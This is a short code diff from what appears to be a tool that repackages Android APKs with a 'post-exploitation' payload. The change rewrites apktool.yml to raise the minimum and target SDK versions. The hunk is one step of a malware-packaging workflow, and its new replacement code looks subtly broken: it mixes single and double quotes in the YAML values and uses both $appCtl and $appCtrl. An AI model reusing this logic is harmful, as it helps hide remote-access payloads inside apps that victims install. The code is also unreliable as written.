@@ -36,9 +36,10 @@ in order for the post-exoloitation features of the payload to work after after i
                                           return;
                                       }
 
-                                      var regex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
-                                      var replace = data.replace(regex, "$122'");
-                                      fs.writeFile(path.join(apkFolder, 'apktool.yml'), replace, 'utf8', (error) => {
+                                      var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
+                                      var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
+                                      var repSdk = data.replace(minSdkRegex, "$119"+'"').replace(tarSdkRegex, "$122"+'"');
+                                      fs.writeFile(path.join(apkFolder, 'apktool.yml'), repSdk, 'utf8', (error) => {
                                         if (error) {
                                             $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
                                             $appCtrl.Log()
